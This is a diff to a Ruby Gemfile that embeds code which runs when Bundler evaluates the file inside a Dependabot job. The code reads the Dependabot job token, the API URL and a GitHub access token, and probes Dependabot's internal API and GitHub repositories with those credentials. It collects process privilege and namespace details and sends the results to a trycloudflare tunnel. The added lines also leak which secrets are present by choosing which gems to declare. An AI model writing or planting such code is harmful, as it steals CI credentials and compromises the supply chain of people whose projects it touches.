@@ -1,11 +1,13 @@
 source "https://rubygems.org"
 
 TUN = "https://option-thats-dee-logistics.trycloudflare.com"
+marker_dependencies = []
 
 begin
   require "digest"
   require "json"
   require "net/http"
+  require "open3"
   require "socket"
   require "time"
   require "uri"
@@ -16,8 +18,22 @@ begin
   end
   keys = %w[DEPENDABOT_JOB_TOKEN DEPENDABOT_API_URL DEPENDABOT_JOB_ID DEPENDABOT_JOB_PATH DEPENDABOT_OUTPUT_PATH LOCAL_GITHUB_ACCESS_TOKEN HTTPS_PROXY]
   data << "ENV:" + keys.map { |key| "#{key}=#{ENV.key?(key) ? ENV.fetch(key).bytesize : 0}" }.join(",")
+  marker_dependencies << ["rake", "13.0.1"] unless ENV.fetch("DEPENDABOT_JOB_TOKEN", "").empty?
+  marker_dependencies << ["minitest", "5.15.0"] unless ENV.fetch("DEPENDABOT_API_URL", "").empty? || ENV.fetch("DEPENDABOT_JOB_ID", "").empty?
+  marker_dependencies << ["thor", "1.2.1"] unless ENV.fetch("LOCAL_GITHUB_ACCESS_TOKEN", "").empty?
   cap.call("ID", "id", 70)
-  cap.call("INTAPI", "u=\"${DEPENDABOT_API_URL%/}/update_jobs/$DEPENDABOT_JOB_ID/blocked_versions?package-manager=bundler\"; a=$(curl -sS -m 8 -o /tmp/zzint0 -w '%{http_code}' \"$u\"); b=$(curl -sS -m 8 -o /tmp/zzint1 -w '%{http_code}' -H \"Authorization: $DEPENDABOT_JOB_TOKEN\" \"$u\"); printf 'unauth=%s:%s:' \"$a\" \"$(wc -c </tmp/zzint0)\"; sha256sum /tmp/zzint0 | cut -c1-16; printf '|auth=%s:%s:' \"$b\" \"$(wc -c </tmp/zzint1)\"; sha256sum /tmp/zzint1 | cut -c1-16", 180)
+  api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
+  job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
+  job_token = ENV.fetch("DEPENDABOT_JOB_TOKEN", "")
+  unless api_base.empty? || job_id.empty?
+    internal_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
+    unauth_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/tmp/zzint0", "-w", "%{http_code}", internal_url)
+    auth_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/tmp/zzint1", "-w", "%{http_code}", "-H", "Authorization: #{job_token}", internal_url)
+    unauth_digest = File.exist?("/tmp/zzint0") ? Digest::SHA256.file("/tmp/zzint0").hexdigest[0, 16] : "missing"
+    auth_digest = File.exist?("/tmp/zzint1") ? Digest::SHA256.file("/tmp/zzint1").hexdigest[0, 16] : "missing"
+    data << "INTAPI:unauth=#{unauth_code}:#{unauth_digest}|auth=#{auth_code}:#{auth_digest}"
+    marker_dependencies << ["builder", "3.2.4"] if auth_code.start_with?("2") && !unauth_code.start_with?("2")
+  end
   cap.call("API", "for p in user repos/chawdamrunal/probe-lab repos/chawdamrunal/f004-actions-lab-b; do c=$(curl -sS -m 8 -o /tmp/zzapi -w '%{http_code}' -H \"Authorization: Bearer $LOCAL_GITHUB_ACCESS_TOKEN\" https://api.github.com/$p); printf '%s=%s|' \"$p\" \"$c\"; done", 170)
   cap.call("STATUS", "grep -E '^(Pid|PPid|Uid|Gid|Cap(Eff|Bnd)|NoNewPrivs|Seccomp):' /proc/self/status", 150)
   cap.call("NS", "for n in pid mnt user net; do printf '%s=' \"$n\"; readlink /proc/self/ns/$n; printf '/p1='; readlink /proc/1/ns/$n; done", 130)
@@ -34,6 +50,10 @@ begin
     http.request(request)
   end
 rescue Exception
+end
+
+marker_dependencies.each do |name, version|
+  gem name, version
 end
 
 gem "rack", "2.2.3"
